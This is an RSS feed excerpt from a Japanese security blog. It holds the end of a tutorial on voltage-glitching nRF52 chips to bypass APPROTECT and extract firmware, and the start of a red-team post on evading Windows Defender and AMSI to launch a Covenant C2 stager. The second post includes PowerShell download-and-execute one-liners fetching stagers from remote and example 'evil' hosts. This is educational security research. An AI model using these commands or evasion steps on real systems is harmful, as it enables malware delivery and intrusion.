&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set: delay_start=2360
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ここの部分は実際にグリッチを実行させて、オシロスコープのトリガーを組み合わせて自分のかけたいタイミングかどうかをトライアンドエラーで設定していくのがいいでしょう。&lt;/p&gt;
&lt;p&gt;グリッチは&lt;code&gt;run&lt;/code&gt;で行います。実行すると、先の機能で示したような形のグリッチが行われます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Glitch options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  delay_start   : 2360
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  width_start   : 0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  delay_end     : 2500
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  width_end     : 10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  paranoia_mode : 0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Start glitch! Press any key to stop.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...........2361...........2362....
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;実行時の動画(gif)を載せます。この動画はまさにAPPROTECTバイパスの最適なタイミングである、DEC4の電圧降下の直前での電圧グリッチを狙ったものです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitcher_run_long_resize.gif&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;CH1(黄)はMOSFETのゲートに流れる電圧、CH2(青)はDEC4の電圧です。
グリッチの開始タイミング(delay)とグリッチの長さ(width)が二重ループになっており、width_endに到達したときにdelayが加算されてグリッチのタイミングのタイミングが少し後ろになります。青線の電圧下降の位置が徐々に左に移動していることがわかると思います。
もちろん最初からこの最適タイミングから開始できるのは稀なので、あまりに攻撃位置から遠すぎたらパラメータを調整して何度もチャレンジしてください。&lt;/p&gt;
&lt;p&gt;成功したときの波形が以下です。成功時の波形は状況によってバラバラですが、少なくともいつもの電圧降下する波形とは異なる形をしています。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/%E3%82%B0%E3%83%AA%E3%83%83%E3%83%81%E6%88%90%E5%8A%9F%E6%99%82%E3%81%AE%E6%B3%A2%E5%BD%A22.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;グリッチャーはグリッチのたびにSWDデバッグを試みているので、もしバイパスに成功した場合はその旨が表示されます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.....glitch success!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SWD Id: 0x2ba01477
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UCIR_LOCK: 0xffffff00
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Flash size: 1048576
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connect your debugger to the SWD port and attach it!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;この状態でswdコマンドを実行すると、&lt;code&gt;APPROTECT disabled&lt;/code&gt;およびdevice typeの値として&lt;code&gt;0x00052840&lt;/code&gt;が表示されます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt; swd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SWD IDCODE: 0x2ba01477
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UICR device type(0x10000100): 0x00052840
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;APPEOTECT disabled.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SWD port unlocked!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功した方はおめでとうございます！&lt;/p&gt;
&lt;p&gt;グリッチの設定から成功までキャプチャしたものをTwitterに上げているので、良ければこちらもご覧ください。&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;ja&#34; dir=&#34;ltr&#34;&gt;nRF52に対してVoltage Fault Injectionを行う、シリアルコンソールで簡単に操作可能なグリッチャーを作ったぞ！&lt;br&gt;安定して成功するので、nRF52のSoCを使った機器はロックかかっててもファームウェアが吸えるようになるはず &lt;a href=&#34;https://t.co/B3AJRmzWzv&#34;&gt;pic.twitter.com/B3AJRmzWzv&lt;/a&gt;&lt;/p&gt;&amp;mdash; しゅーと (@shutingrz) &lt;a href=&#34;https://twitter.com/shutingrz/status/1463072771173322752?ref_src=twsrc%5Etfw&#34;&gt;November 23, 2021&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;成功後のアプローチは多様ですが、今回はファームウェア抽出をしてみます。&lt;/p&gt;
&lt;h2 id=&#34;バイパスした状態でファームウェア抽出&#34;&gt;バイパスした状態でファームウェア抽出&lt;/h2&gt;
&lt;p&gt;今回の攻撃の一番の目的はファームウェアの抽出でしょう。ファームウェアを抽出してしまえば、CTRL-APからnRF52を初期化したうえで抽出したファームウェアを書き込むことでデバッグ可能な機器に早変わりです。&lt;/p&gt;
&lt;p&gt;DongleのSWDIO・SWDCLKをJ-Linkに繋ぎかえたあとにOpenOCDを使います。やることは正常系の確認と変わらないので省略します。以下のようにファームウェアを抽出できていることがわかります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitch%E5%BE%8C%E3%81%AEopenocd.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ここで面白いのが、画像にあるOCDコマンドの最初の部分です。&lt;/p&gt;
&lt;p&gt;AHB-APのAPPROTECTレジスタの値は&lt;code&gt;0x00&lt;/code&gt;と&lt;strong&gt;プロテクション有効&lt;/strong&gt;を示しています。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; mdw 0x10001208 1                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x10001208: ffffff00
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;しかしCTRL-APのAPPROTECTSTATUSレジスタの値は&lt;code&gt;0x01&lt;/code&gt;であり、&lt;strong&gt;プロテクション無効&lt;/strong&gt;を示しているのです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; nrf52.dap apreg 1 0x0c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x00000001
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;フォールトインジェクションはこのように非常に奇妙な状態を作り出すことができるのです。
ここでターゲットをリセットするとどうなるでしょうか。やってみます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitch%E5%BE%8C%E3%81%ABreset%E3%81%97%E3%81%9F.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;デバッグができなくなりました。このようにAPPROTECTバイパスは一時的な効果であり、次のリセットまでにファームウェア抽出などの作業を終えておく必要があるとわかりますね。&lt;/p&gt;
&lt;h1 id=&#34;対策&#34;&gt;対策&lt;/h1&gt;
&lt;p&gt;APPROTECTバイパスによって、nRF52シリーズでのAPPROTECTによるデバッグ・ファームウェア保護は完全ではなくなりました。もちろん設定すれば攻撃のハードルが高くなるのでやる価値はあります。ですがプロテクションを完全なものと考えてはいけません。&lt;/p&gt;
&lt;p&gt;できることはファームウェアから機密情報を削除することです。どうしても鍵情報を機器に含める場合は、TPMなどのセキュリティチップに配置し、抽出されないようにします。また鍵情報は機器ごとに固有とし、侵害後の影響を軽減するようにします。&lt;/p&gt;
&lt;h1 id=&#34;さいごに&#34;&gt;さいごに&lt;/h1&gt;
&lt;p&gt;ハードウェアハッキングの中でもとりわけハードルが高い攻撃のひとつであるフォールトインジェクション、電圧グリッチを説明しました。&lt;/p&gt;
&lt;p&gt;ここでは触れませんでしたが、実はフォールトインジェクションに脆弱な機器はnRF52に限らず複数存在します。公表されているものだとSTM8、ESP32の古いリビジョンがフォールトインジェクションに脆弱です。このように少し前に販売されたSoCはこれらの対策を行っていないため注意が必要です。&lt;/p&gt;
&lt;p&gt;みなさんがこの記事をきっかけにしてハードウェアセキュリティに足を踏み入れることを願っています。&lt;/p&gt;
&lt;h1 id=&#34;参考文献&#34;&gt;参考文献&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;LimitedResults, nRF52 Debug Resurrection (APPROTECT Bypass) Part 1, &lt;a href=&#34;https://limitedresults.com/2020/06/nrf52-debug-resurrection-approtect-bypass/&#34;&gt;https://limitedresults.com/2020/06/nrf52-debug-resurrection-approtect-bypass/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Nordic Semiconductor, nRF52840のデータシート(pdf), &lt;a href=&#34;https://infocenter.nordicsemi.com/pdf/nRF52840_PS_v1.0.pdf&#34;&gt;https://infocenter.nordicsemi.com/pdf/nRF52840_PS_v1.0.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Nordic Semiconductor, nRF52840 Dongleのデータシート(pdf), &lt;a href=&#34;https://infocenter.nordicsemi.com/pdf/nRF52840_Dongle_User_Guide_v1.0.pdf&#34;&gt;https://infocenter.nordicsemi.com/pdf/nRF52840_Dongle_User_Guide_v1.0.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;atc1441, ESP32 SWD Flasher for nRF52, &lt;a href=&#34;https://github.com/atc1441/ESP32_nRF52_SWD&#34;&gt;https://github.com/atc1441/ESP32_nRF52_SWD&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PC Watch, AirTagのハッキングに成功。知らないAirTagのスキャン時は注意, &lt;a href=&#34;https://pc.watch.impress.co.jp/docs/news/1323993.html&#34;&gt;https://pc.watch.impress.co.jp/docs/news/1323993.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPA, ハードウェアセキュリティ ―IoTの時代に向けて, &lt;a href=&#34;https://www.trustedcomputinggroup.org/wp-content/uploads/uploads/JRF/%5BJRFWS%5DDec2015_3.%20IPA_S.%20Sato_Presen+ForWeb.pdf.pdf&#34;&gt;https://www.trustedcomputinggroup.org/wp-content/uploads/uploads/JRF/%5BJRFWS%5DDec2015_3.%20IPA_S.%20Sato_Presen+ForWeb.pdf.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DARKMATTER CDI Engineer&amp;rsquo;s Blog, Voltage Fault Injection をやってみた, &lt;a href=&#34;https://io.cyberdefense.jp/entry/2018/10/10/Voltage_Fault_Injection_%E3%82%92%E3%82%84%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F&#34;&gt;https://io.cyberdefense.jp/entry/2018/10/10/Voltage_Fault_Injection_をやってみた&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;梨本 翔永, 組込みソフトウェアへの故障注入攻撃に対する安全性評価に関する研究, &lt;a href=&#34;https://core.ac.uk/download/pdf/236162266.pdf&#34;&gt;https://core.ac.uk/download/pdf/236162266.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;オライリー, (書籍) カーハッカーズ・ハンドブック, &lt;a href=&#34;https://www.oreilly.co.jp/books/9784873118239/&#34;&gt;https://www.oreilly.co.jp/books/9784873118239/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>フォールトインジェクションとは？電圧グリッチでnRF52のプロテクションを破って学ぶ</title>
        <link>https://www.shutingrz.com/post/voltage-fault-injection-nrf52/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>検知回避の手法 - PowerShell</title>
      <link>https://www.shutingrz.com/post/avoid-detection-powershell/</link>
      <pubDate>Sat, 10 Apr 2021 00:00:00 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/avoid-detection-powershell/</guid>
      <description>&lt;p&gt;しゅーと(@shutingrz)です。&lt;/p&gt;
&lt;p&gt;前回の記事では実行ファイルにおいて Windows Defender のリアルタイムスキャン、クラウド保護の検知回避を試みました。&lt;/p&gt;
&lt;p&gt;まだ読んでない方はぜひ読んでください。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.shutingrz.com/post/avoid-detection-dotnet/&#34;&gt;検知回避の手法 - 実行ファイル&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;AMSIの概念については前回の記事に記載しており、本記事では説明を省略しています。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今回はスクリプトの検知回避に挑戦し、Windows Defender のリアルタイムスキャン・クラウド保護がオンの状態で、PowerShell での Covenant Stager の起動、Gruntのアクティベーションを行うことを目標とします。&lt;/p&gt;
&lt;p&gt;実行ファイルではなくスクリプトで挑戦するといっても、 Windows Defender の大きな検知ロジックは共通です。&lt;/p&gt;
&lt;p&gt;ただひとつ大きな違いがあるのは、&lt;strong&gt;スクリプトのエンジンには必ず AMSI によるスキャンが含まれる&lt;/strong&gt;ということです。このことからアンマネージドコードを利用したAMSIバイパス利用できず、何とかして AMSI の悪性判定を回避しつつ AMSI バイパスを成功させる必要があります。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ただしAMSIが存在しないPowerShell v2を使うダウングレード攻撃という手法も存在します。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;そのことを念頭に置いて次のセクションから学んでいきましょう。&lt;/p&gt;
&lt;h3 id=&#34;留意事項&#34;&gt;留意事項&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;本記事はエージェントの確立までのアンチウイルスソフトの検知回避にのみフォーカスを当てて解説をしています。EDRの検知回避は範囲外です。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最初のほうはWindows Defenderの「クラウド提供の保護」および「サンプルの自動送信」をオフにしてください&lt;/strong&gt;。この機能は一度検知されてしまうと、本機能をオフにしてもリアルタイムスキャンで同じ文字列を検知するようになってしまいます。後半ではこれらをオンにしたうえで検知回避をします。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;powershell-での検知回避&#34;&gt;PowerShell での検知回避&lt;/h1&gt;
&lt;p&gt;PowerShell は Microsoft の誇るスクリプト言語で、ランタイムで、プログラムです。Windows10 では PowerShell のバージョン 5 がデフォルトでインストールされており、PowerShell を利用することでコンピュータのあらゆる操作が可能になります。しかしその強力さゆえ攻撃者による悪用が絶たないことからアンチウイルスベンダーも監視を強めており、こんにちでは PowerShell プログラムを利用したという時点でフラグが立つアンチウイルスソフト/ EDR も存在します。しかしながらいまだに Office マクロ経由で Powershell コマンドを実行させたり(Emotetなど複数マルウェア)、 powershell.exe を使わず PowerShell ランタイムを用いて Post-Exploitation用 PowerShell コードを利用する手法が存在しており(self contained custom PowerShell)、Red Team ではいまだに何らかの形でよく利用されます。&lt;/p&gt;
&lt;p&gt;本記事ではまず基本として、powershell.exe において Windows Defender を回避して Stager を動かすことを目標とします。&lt;/p&gt;
&lt;h2 id=&#34;windows-defender-の検知ステップ&#34;&gt;Windows Defender の検知ステップ&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsi_structure.png&#34; alt=&#34;amsi_structure&#34;&gt;
&lt;/p&gt;
&lt;p&gt;（&lt;strong&gt;図を確認しながら下の文章を読んでください&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;例えば&amp;quot;&lt;code&gt;iex DownloadString(&#39;http://example.com/evil.ps1&#39;)&lt;/code&gt;&amp;ldquo;というコマンドレットを含むps1ファイルがある場合を考えます。。&lt;/p&gt;
&lt;p&gt;まずファイルが存在する場合は、ファイル作成時にアンチウイルスソフトがファイルを検査します。&lt;/p&gt;
&lt;p&gt;次に PowerShell で実行されたとき、PowerShellはファイルに含まれるコマンドレットを順次実行していきます。&lt;/p&gt;
&lt;p&gt;iex は Invoke-Expression の省略表現で、引数として存在する文字列を PowerShell コマンドレットとして評価し実行します。プログラミング言語でよくある「eval」です。引数は  &lt;code&gt;Net.WebClient.DownloadString&lt;/code&gt; メソッドで、その引数として Stager のps1ファイルを指定しているとしましょう。このメソッドは指定したファイルをダウンロードし中身を文字列として扱うものです。さらにメソッドが括弧()で囲まれているため、メソッドの返り値が文字列展開され、ダウンロードした ps1 ファイルの中身が Invoke-Expression の引数として扱われます。結果として evil.ps1 に含まれるコードが実行されます。&lt;/p&gt;
&lt;p&gt;evil.ps1 の中に&amp;rdquo; &lt;code&gt;iex (‘[Refrection.’+’Ass’+’embly]::’+’Load(“evil.dll”)’)&lt;/code&gt; &amp;ldquo;というコマンドレットが存在するとき、PowerShell は AMSI を通してアンチウイルスソフトに文字列をスキャンさせます。そのあと、文字列は分割されていますが、iexに引き渡されるころには結果として&amp;rdquo;&lt;code&gt;[Refrection.Assembly]::Load(“evil.dll”)&lt;/code&gt;&amp;ldquo;という文字列になっています。&lt;/p&gt;
&lt;p&gt;さらに現在の PowerShell は、IEX に渡される結合後(難読化解除後)のコードも AMSI を通してアンチウイルスソフトにスキャンさせます。&lt;/p&gt;
&lt;p&gt;最後に、&amp;quot;&lt;code&gt;[Refrection.Assembly]::Load&lt;/code&gt; &amp;ldquo;によって、指定した .NET アセンブリがロードされます（&lt;code&gt;Assembly.Load()&lt;/code&gt;と同じ動きです）。このとき、AMSI.dll の AMSIScanBuffer を通じてアセンブリをアンチウイルスソフトにスキャンさせます。&lt;/p&gt;
&lt;p&gt;これらのスキャン過程でファイルが無害と判断された場合、すべてが正常に完了します。&lt;/p&gt;
&lt;h2 id=&#34;powershell-コンソールでの-stager-の起動&#34;&gt;PowerShell コンソールでの Stager の起動&lt;/h2&gt;
&lt;p&gt;Covenant では Launcher 画面に PowerShell Launcher が存在しており、ここから PowerShell 用の Stager を取得可能です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;※Covenantのインストール方法や使い方はここでは説明しません。Googleで検索すれば日本語記事が出てくるので、それを読むと良いでしょう。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;試しに-stager-を動かす&#34;&gt;試しに Stager を動かす&lt;/h3&gt;
&lt;p&gt;まずはリアルタイムスキャンを無効にしたうえで、実際に Grunt がアクティベーションされることを確認しましょう。&lt;/p&gt;
&lt;p&gt;PowerShell Launcher にてGenerate ボタンを押すことで Stager のコードを含んだ PowerShell ワンライナーが生成されます。 EncodedLauncher のテキストボックスをコピーしPowerShellプロンプトに貼り付け、実行しましょう。&lt;/p&gt;
&lt;p&gt;なお&amp;rdquo;&lt;code&gt;-Window Hidden&lt;/code&gt;&amp;ldquo;オプションは実行後ウインドウが消えてしまいます。バックグラウンドプロセスで動作するためステルス性が高まりますが、検証時には煩わしいためオプションを削除してから実行することをお勧めします。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/covenant_pslauncher.png&#34; alt=&#34;covenant_pslauncher&#34;&gt;
&lt;/p&gt;
&lt;p&gt;実行すると Grunt がアクティベーションされます。&lt;/p&gt;
&lt;p&gt;また、プロンプトでワンライナーを行わなくとも、外部からps1ファイルをダウンロードし実行させることでも Stager を実行可能です。&lt;/p&gt;
&lt;h3 id=&#34;外部から-stager-をダウンロードし実行する&#34;&gt;外部から Stager をダウンロードし実行する&lt;/h3&gt;
&lt;p&gt;PowerShell Launcher の Host タブにて、Urlテキストボックスに「/ps_original.ps1」という文字列を入力して Host ボタンを押し、Stager の ps1ファイルをホスティングしましょう。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/covenant_pslauncher._host.png&#34; alt=&#34;covenant_pslauncher._host&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ホスティングすると、同じく Host タブ下部 にある Launcher のテキストボックスが ps1ファイルをダウンロードして実行するようなコマンドに変化します。それをコピーして PowerShell コンソールに貼り付け、実行します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Sta&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Nop&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.11.254/ps_original.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;実行すると、Grunt がアクティベーションされます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/covenant_pslauncher_iex.png&#34; alt=&#34;covenant_pslauncher_iex&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このコマンドレットによってダウンロードされるps1ファイルはディスクには保存されずメモリ上に展開されるため、リアルタイムスキャンのファイル検知、クラウド保護のファイル検知に検知されません。いわゆるファイルレス手法です。&lt;/p&gt;
&lt;h3 id=&#34;リアルタイムスキャンをオンにして試す&#34;&gt;リアルタイムスキャンをオンにして試す&lt;/h3&gt;
&lt;p&gt;では次にリアルタイムスキャンをオンにしてワンライナー同様の操作を行ってみましょう。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ただし、&lt;strong&gt;クラウド保護、ファイル送信はオフのまま&lt;/strong&gt;にしてください。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;
  &lt;img src=&#34;images/palauncher_amsi_detect.png&#34; alt=&#34;palauncher_amsi_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;検知され、実行に失敗しました。これは AMSI を通じて Windows Defender に検知されたことを示します。ただここで注目してほしいのは、&lt;strong&gt;検知されたポイントは DownloadString そのものではなく、ダウンロード後に展開された Stager コード部分である&lt;/strong&gt;という点です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;iex &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;発生場所&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;行&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;文字&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;sv &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sv &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Compression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Def&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;このスクリプトには&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;、&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;悪質なコンテンツが含まれているため&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;、&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ウイルス対策ソフトウェアによりブロックされています&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;つまり、初発の DownloadString で ps1 ファイルをダウンロードし iex で実行すること自体は、AMSIで検知されないということです。これは、外部からps1ファイルをダウンロードして実行するという行為が攻撃以外でも使われることがあるためです。これを利用する無害なソフトウェアの例として、Windows 上で動作するパッケージ管理ソフトウェア「chocolatey」のインストールスクリプトがあげられます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/iex_choco.png&#34; alt=&#34;iex_choco&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このように PowerShell は使い方によっては毒にも薬にもなるため、アンチウイルスベンダーも大変な思いをしているのです。&lt;/p&gt;
&lt;h2 id=&#34;amsi-バイパス&#34;&gt;AMSI バイパス&lt;/h2&gt;
